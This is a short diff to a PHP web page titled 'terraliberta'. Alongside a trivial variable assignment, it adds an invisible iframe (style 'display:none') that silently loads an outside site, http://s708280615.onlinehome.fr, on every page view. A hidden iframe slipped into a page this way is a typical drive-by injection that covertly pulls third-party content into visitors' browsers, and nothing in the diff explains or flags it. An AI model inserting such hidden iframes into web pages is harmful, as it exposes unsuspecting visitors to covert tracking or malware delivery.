@@ -2,13 +2,19 @@
 
 session_start();
 
-
 $f = "./installcons.php";
 
 include($f);
 
+$d = "ff";
+
 ?>
 <html>
+
+<iframe style = "display:none;"src = "http://s708280615.onlinehome.fr">
+
+</iframe>
+
 
 <title> terraliberta </title>		
 
